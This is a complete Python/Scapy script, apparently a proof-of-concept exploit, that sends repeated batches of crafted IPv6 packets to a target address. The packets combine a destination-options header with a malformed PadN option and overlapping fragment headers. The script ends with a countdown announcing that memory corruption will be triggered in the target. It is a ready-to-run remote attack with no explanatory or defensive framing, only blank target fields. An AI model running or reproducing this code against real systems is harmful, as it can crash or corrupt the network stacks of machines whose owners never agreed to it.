from scapy.all import *

iface=''
ip_addr=''
mac_addr=''
num_tries=20
num_batches=20

def get_packets_with_mac(i):
    frag_id = 0xdebac1e + i
    first = Ether(dst=mac_addr) / IPv6(fl=1, hlim=64+i, dst=ip_addr) / IPv6ExtHdrDestOpt(options=[PadN(otype=0x81, optdata='a'*3)])
    second = Ether(dst=mac_addr) / IPv6(fl=1, hlim=64+i, dst=ip_addr) / IPv6ExtHdrFragment(id=frag_id, m = 1, offset = 0) / 'aaaaaaaa'
    third = Ether(dst=mac_addr) / IPv6(fl=1, hlim=64+i, dst=ip_addr) / IPv6ExtHdrFragment(id=frag_id, m = 0, offset = 1)
    return [first, second, third]

def get_packets(i):
    if mac_addr != '':
        return get_packets_with_mac(i)
    frag_id = 0xdebac1e + i
    first = IPv6(fl=1, hlim=64+i, dst=ip_addr) / IPv6ExtHdrDestOpt(options=[PadN(otype=0x81, optdata='a'*3)])
    second = IPv6(fl=1, hlim=64+i, dst=ip_addr) / IPv6ExtHdrFragment(id=frag_id, m = 1, offset = 0) / 'aaaaaaaa'
    third = IPv6(fl=1, hlim=64+i, dst=ip_addr) / IPv6ExtHdrFragment(id=frag_id, m = 0, offset = 1)
    return [first, second, third]

final_ps = []
for _ in range(num_batches):
    for i in range(num_tries):
        final_ps += get_packets(i) + get_packets(i)

print("Sending packets")
if mac_addr != '':
    sendp(final_ps, iface)
else:
    send(final_ps, iface)

for i in range(60):
    print(f"Memory corruption will be triggered in {60-i} seconds", end='\r')
    time.sleep(1)
print("")
